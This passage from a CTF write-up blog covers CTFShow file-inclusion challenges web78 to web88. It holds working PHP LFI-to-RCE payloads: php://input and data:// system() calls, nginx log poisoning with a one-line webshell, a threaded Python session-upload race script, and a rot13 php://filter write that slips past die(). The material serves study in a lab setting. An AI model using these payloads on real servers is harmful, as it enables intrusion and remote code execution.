-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_2.png"></p>
-<p><strong>方法二：</strong></p>
-<pre><code> 1. 尝试使用 php://filter/read=convert.base64-encode/resource=flag.php
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_3.png"></p>
-<p>​    base64解码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;db4b1df7-****-4633-ac61-717d14afa306&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>​    得到了 flag.</p>
-<h2 id="web79——文件包含"><a href="#web79——文件包含" class="headerlink" title="web79——文件包含"></a>web79——文件包含</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>首先发现题目 使用 str_replace 将php替换为了 ???</p>
-<p><strong>方法一：</strong></p>
-<pre><code> 1. 使用 大写 绕过:
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79.png"></p>
-<p><strong>方法二：</strong></p>
-<pre><code> 1. 使用 mv 命令 将 flag.php 重命名为 a.txt
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;mv flag.php a.txt&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code> 2. 查看 a.txt 
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_2.png"></p>
-<p><strong>方法三：</strong></p>
-<ol>
-<li>使用 data:// 协议:</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 未使用 base64 编码</span></span><br><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system(&quot;tac f*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// 使用 base64 编码 </span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;tac flag.php&#x27;); = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_1.png"></p>
-<h2 id="web80——文件包含——日志shell"><a href="#web80——文件包含——日志shell" class="headerlink" title="web80——文件包含——日志shell"></a>web80——文件包含——日志shell</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p>过滤了 php 和 data:</p>
-<p><strong>方法一：</strong></p>
-<pre><code> 1. 尝试使用 php://input：
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post：</span><br><span class="line">   	<span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;tac fl0g.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80.png"></p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
-<pre><code> 2. 尝试使用 data:// 协议并 大写 DATA:// 但绕过失败
-</code></pre>
-<p><strong>方法二：</strong></p>
-<pre><code> 1. 利用 日志 shell ： /var/log/nginx/access.log
- 2. bp 中 user-agent 写入一句话
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_2.png"></p>
-<pre><code> 3. 尝试连接:
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_3.png"></p>
-<p>​    4. 查找 flag（省略）</p>
-<h2 id="web81——文件包含——日志shell"><a href="#web81——文件包含——日志shell" class="headerlink" title="web81——文件包含——日志shell"></a>web81——文件包含——日志shell</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>可以发现文中将 php/data/: 都替换为了 ???;</li>
-<li>尝试是否能查看 服务器日志: ?file=/var/log/nginx/access.log — 成功</li>
-</ol>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81.png"></p>
-<p>   3.将一句话木马 写入到 User Agent当中: HackBar/Burp:</p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
-<p>   4.再次查看日志，日志是否包含了 一句话: — 有</p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_2.png"></p>
-<p>   5.蚁剑/菜刀连接:</p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_3.png"></p>
-<p>   查找flag:</p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_4.png"></p>
-<h2 id="web82——文件包含"><a href="#web82——文件包含" class="headerlink" title="web82——文件包含"></a>web82——文件包含</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<p><strong>分析：</strong></p>
-<p>把 php,data,:, . 都替换为了 ??? ; 这些协议都用不了可以考虑尝试用 session对话文件包含</p>
-<p>​    1.编辑一个文件上传的页面:</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;目标URL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​    2.将 “目标URL” 跟改为题目地址: 上传一个 txt 文件 内容字母数字随便都可</p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82.png"></p>
-<pre><code> 3. Bp 抓包:
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_1.png"></p>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_2.png"></p>
-<p>​    如图所示 在头部 加入 Cookie:PHPSESSID=test ，将 PHP_SESSION_UPLOAD_PROGRESS 内容修改为: <?php system('tac f*.php');?>  再将 Payloads type 设置为 Null payloads, 开启爆破</p>
-<pre><code> 4. 再爆破一个 请求地址 : ?file=/tmp/sess_test  ; sess_test就是产生的一个临时文件 test就是刚刚设置的 Cookie:PHPSESSID=test，现在需要读取这个文件，由于此文件可能会立马删除，因此也需要一个 爆破请求:
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_3.png"></p>
-<pre><code>5. 观察结果: 在读取目标的请求爆破中查看 响应结果：如下图
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_4.png"></p>
-<pre><code> 6. 当然也可以写一个 脚本来实现爆破：奈何我是菜鸡🐔一只，参考了大佬的脚本:
-</code></pre>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://59af8191-fdc8-414f-bb1c-f2726b946851.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		file = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		response = session.post(</span><br><span class="line">			url,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat *.php&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, file)&#125;</span><br><span class="line">		)</span><br><span class="line">	<span class="comment"># print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> event.isSet():</span><br><span class="line">		response = session.get(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> +sessID)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">			<span class="built_in">print</span>(response.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>*<span class="number">10</span> + <span class="string">&#x27;ReTrying&#x27;</span> + <span class="string">&#x27;+&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event = threading.Event()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Write, args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=Read, args=(session,)).start()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web82_5.png"></p>
-<h2 id="web83——文件包含"><a href="#web83——文件包含" class="headerlink" title="web83——文件包含"></a>web83——文件包含</h2><p><strong>同上</strong></p>
-<h2 id="web84——文件包含"><a href="#web84——文件包含" class="headerlink" title="web84——文件包含"></a>web84——文件包含</h2><p><strong>同上</strong></p>
-<h2 id="web85——文件包含"><a href="#web85——文件包含" class="headerlink" title="web85——文件包含"></a>web85——文件包含</h2><p><strong>同上，类似</strong></p>
-<h2 id="web86——文件包含"><a href="#web86——文件包含" class="headerlink" title="web86——文件包含"></a>web86——文件包含</h2><p><strong>同上，类似</strong></p>
-<h2 id="web87——文件包含"><a href="#web87——文件包含" class="headerlink" title="web87——文件包含"></a>web87——文件包含</h2><p>源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>分析</strong>：</p>
-<ol>
-<li>依旧将 php, data, : , . 替换为了 ???</li>
-<li>GET一个 file, POST一个 content, </li>
-<li>urldecode($fie) 将GET到的file URL解码，既然一开始就要解码那么在将file传入时就得URL编码一次，然而四个str_replace()会将其内容替换，那么害得 URL编码一次，所以一共需要 URL编码两次。（Full URL Encode）</li>
-<li>“<?php die('大佬别秀了');?>“.$content . POST传入的content将和前面这句php拼接在一起。当正常执行的时候，首先执行 die(‘大佬别秀了’) 这个die()将会结束程序的执行，那么我POST传入的内容未被执行，因此需要想办法绕过这个 die() 不然我就狗带了。使用编码绕过比如 将 content按照某个编码进行编码。那么程序在执行时会先进行解码。我们编码的内容当然能正常解码，而前面de die()并不是某个编码所以对die()进行解码就会变成乱码或其他，php将不能认出die()就不会执行die()这样就绕过了die()。后面的content仍然会执行成功。</li>
-</ol>
-<p><strong>试验:</strong></p>
-<ol>
-<li>php://filter/write=string.rot13/resource=2.php 这句话的意思是 将2.php 按照 rot13编码写入到目录中去; Full URL Encode 两次</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">41</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">43</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>
-
-<pre><code> 2. content = &lt;?php system(&#39;tac f*&#39;);?&gt; 进行 rot13编码:
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="meta">&lt;?</span>cuc flfgrz(<span class="string">&quot;gnp s*.cuc&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87.png"></p>
-<pre><code>3. 如上图执行
-4. 访问 2.php 页面
-</code></pre>
-<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87_1.png"></p>
-<h2 id="web88——文件包含"><a href="#web88——文件包含" class="headerlink" title="web88——文件包含"></a>web88——文件包含</h2><p>源码:</p>
